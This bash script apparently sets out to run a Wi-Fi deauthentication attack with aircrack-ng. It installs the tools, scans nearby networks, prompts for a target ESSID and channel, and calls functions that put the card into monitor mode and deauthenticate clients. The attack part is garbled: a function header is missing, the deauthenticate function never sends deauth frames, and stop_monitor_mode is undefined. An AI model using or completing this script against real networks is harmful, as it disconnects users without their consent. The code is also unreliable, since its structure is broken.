#!/bin/bash


command_exists() {
    command -v "$1" &> /dev/null
}


install_parallel() {
    case "$(uname -s)" in
        Linux*)
            if command_exists apt-get; then
                sudo apt-get install parallel
            elif command_exists yum; then
                sudo yum install parallel
            elif command_exists dnf; then
                sudo dnf install parallel
            elif command_exists zypper; then
                sudo zypper install parallel
            elif command_exists pacman; then
                sudo pacman -S parallel
            else
                echo "Package manager not supported for Parallel installation."
                exit 1
            fi
            ;;
        Darwin*)
            if command_exists brew; then
                brew install parallel
            else
                echo "Please install Homebrew to install Parallel on macOS."
                exit 1
            fi
            ;;
        *)
            echo "OS not supported for Parallel installation."
            exit 1
            ;;
    esac
}


install_aircrack_ng() {
    case "$(uname -s)" in
        Linux*)
            if command_exists apt-get; then
                sudo apt-get install aircrack-ng
            elif command_exists yum; then
                sudo yum install aircrack-ng
            elif command_exists dnf; then
                sudo dnf install aircrack-ng
            elif command_exists zypper; then
                sudo zypper install aircrack-ng
            elif command_exists pacman; then
                sudo pacman -S aircrack-ng
            else
                echo "Package manager not supported for Aircrack-ng installation."
                exit 1
            fi
            ;;
        Darwin*)
            if command_exists brew; then
                brew install aircrack-ng
            else
                echo "Please install Homebrew to install Aircrack-ng on macOS."
                exit 1
            fi
            ;;
        *)
            echo "OS not supported for Aircrack-ng installation."
            exit 1
            ;;
    esac
}

check_and_install() {
    local tool=$1
    local install_function=$2
    if ! command_exists "$tool"; then
        echo "$tool is not installed."
        read -p "Would you like to install it? (yes/no): " install_choice
        if [ "$install_choice" = "yes" ]; then
            $install_function
        else
            echo "$tool is required to run this script."
            exit 1
        fi
    fi
}


check_and_install parallel install_parallel
check_and_install airmon-ng install_aircrack_ng
check_and_install aireplay-ng install_aircrack_ng




show_wireless_interfaces() {
    echo "Listing available wireless network interfaces:"
    iwconfig | grep "IEEE 802.11" | awk '{print $1}'
}

scan_network() {
    INTERFACE=$1
    echo "Scanning network on interface $INTERFACE..."
    sudo iwlist $INTERFACE scan | grep "ESSID\|Channel"
}

# Start monitor mode, deauthenticate and then stop monitor mode
    sudo airmon-ng start $INTERFACE
    MON_INTERFACE="${INTERFACE}mon"
}

deauthenticate() {
    sudo iwconfig $MON_INTERFACE channel $SELECTED_CHANNEL
# Start monitor mode, deauthenticate and then stop monitor mode
}


show_wireless_interfaces


read -p "Select a wireless network interface to use: " INTERFACE


show_wireless_interfaces | parallel -j 0 scan_network

read -p "Enter the ESSID of the wireless network: " SELECTED_ESSID
read -p "Enter the Channel of the wireless network: " SELECTED_CHANNEL

start_monitor_mode
deauthenticate
stop_monitor_mode
